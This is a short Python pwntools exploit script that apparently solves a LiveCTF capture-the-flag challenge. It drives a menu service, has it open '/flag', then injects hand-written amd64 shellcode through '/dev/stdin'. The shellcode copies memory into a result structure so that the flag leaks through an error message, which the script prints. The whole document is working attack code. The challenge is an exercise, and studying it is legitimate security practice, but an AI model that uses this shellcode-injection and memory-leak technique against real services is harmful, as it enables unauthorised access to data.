#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

context.arch='amd64'

io = remote(HOST, int(PORT))

time.sleep(0.5)
io.sendline('1')
io.recvuntil('Choice:')
io.sendline('/flag')

time.sleep(0.5)

io.sendline('1')
io.recvuntil('Choice:')
io.sendline('/flag')

time.sleep(0.5)

io.sendline('1')
io.recvuntil('Choice:')
io.sendline('/dev/stdin')
io.send(asm("""
a:
mov r8, [rbp-0x28]
lea rdi, [r8+0xc]
lea rsi, [rip+a-0x2000]
mov ecx, 0x100
mov dword ptr [r8+0x4], 1
rep movsb
mov eax, __NR_exit_group
syscall
"""))

time.sleep(0.5)

io.sendlineafter('Choice: ', '2')
io.recvuntil('Failed to complete\n')
flag = io.recvline()
flag = flag.decode()
flag = flag.replace('LiveCTF{LiveCTF{', 'LiveCTF{')
flag = flag.replace('}}', '}')
print(flag)
log.info('Flag: %s', flag)
